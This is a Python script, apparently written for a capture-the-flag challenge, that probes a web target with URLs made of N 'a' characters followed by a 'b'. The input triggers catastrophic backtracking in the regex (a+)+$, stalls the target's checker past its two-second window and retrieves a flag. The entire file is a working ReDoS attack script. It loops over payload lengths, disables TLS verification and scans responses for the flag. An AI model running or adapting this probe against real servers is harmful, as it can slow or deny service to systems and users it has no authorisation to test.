# Probe a ReDoS race condition.
#
# The target spawns a bot that runs re.match(r'(a+)+$', path) and only waits
# ~2s for it. Input "a"*N + "b" triggers catastrophic backtracking; find the N
# that makes the response take >2s (without hitting 414 URI Too Large), which
# wins the race and returns the flag.
#
# Usage: python redos_probe.py https://TARGET_HOST:PORT/flag/ [lengths...]
import sys
import time
import requests

requests.packages.urllib3.disable_warnings()

BASE = sys.argv[1] if len(sys.argv) > 1 else "https://TARGET_HOST:PORT/flag/"
candidates = [800, 1000, 1200, 1500, 1800, 2000, 2300, 2600, 3000, 3500, 4000, 5000, 6000, 8000]
if len(sys.argv) > 2:
    candidates = [int(x) for x in sys.argv[2].replace(",", " ").split()]

print("Probing lengths:", candidates)
for n in candidates:
    url = BASE + "a" * n + "b"
    print(f"\nlen={n} (url~{len(url)}): ", end="", flush=True)
    try:
        t0 = time.time()
        r = requests.get(url, timeout=15, verify=False)
        elapsed = time.time() - t0
    except requests.exceptions.ReadTimeout:
        print("timeout after 15s")
        continue
    except Exception as e:
        print("error:", e)
        continue

    print(f"HTTP {r.status_code}, {elapsed:.3f}s")
    if r.status_code == 414:
        print(" -> URL too large; try smaller")
        continue
    text = r.text
    if "here's the flag" in text or ("flag" in text.lower() and "robot" not in text.lower()):
        print("=== POSSIBLE FLAG ===\n", text)
        break
    if elapsed > 2.0:
        print(" -> >2s, likely hit the regex hang:", text[:500])
